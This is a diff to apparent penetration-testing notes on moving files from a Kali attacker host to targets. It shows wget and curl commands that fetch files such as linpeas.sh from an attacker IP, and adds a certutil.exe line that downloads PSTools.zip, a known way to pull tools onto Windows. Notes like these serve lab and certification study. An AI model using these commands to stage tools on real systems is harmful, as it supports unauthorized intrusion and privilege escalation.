@@ -14,3 +14,5 @@ wget http://\<Kali IP address>/\<filename>
 ## Windows client to get files from HTTP server
 curl http://\<Kali IP address>/\<filename>
   * example: curl http://192.168.57.5/linpeas.sh
+
+certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
